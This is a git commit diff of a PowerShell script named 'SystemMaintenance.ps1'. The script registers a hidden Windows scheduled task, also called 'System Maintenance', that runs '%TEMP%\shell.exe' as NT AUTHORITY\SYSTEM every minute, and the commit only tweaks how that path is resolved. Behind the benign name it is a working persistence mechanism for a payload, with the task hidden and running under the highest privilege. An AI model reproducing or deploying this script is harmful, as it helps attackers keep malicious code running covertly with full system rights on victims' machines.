11e1e8ae5675e3163ddb44a1d6f76b19eaa033c4
vanluong <127461439+vanluongkma@users.noreply.github.com>
2025-03-12 19:45:31 +0700

    Update SystemMaintenance.ps1

--- SystemMaintenance.ps1
+++ SystemMaintenance.ps1
@@ -1,10 +1,9 @@
 $taskName = "System Maintenance"
-$exePath = "$env:TEMP\shell.exe"
+$exePath = [System.IO.Path]::GetFullPath("$env:TEMP\shell.exe")
 $action = New-ScheduledTaskAction -Execute $exePath
 $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 1)
 $settings = New-ScheduledTaskSettingsSet -Hidden
 $principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal
 Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
-
 Write-Host "Scheduled task '$taskName' created successfully."
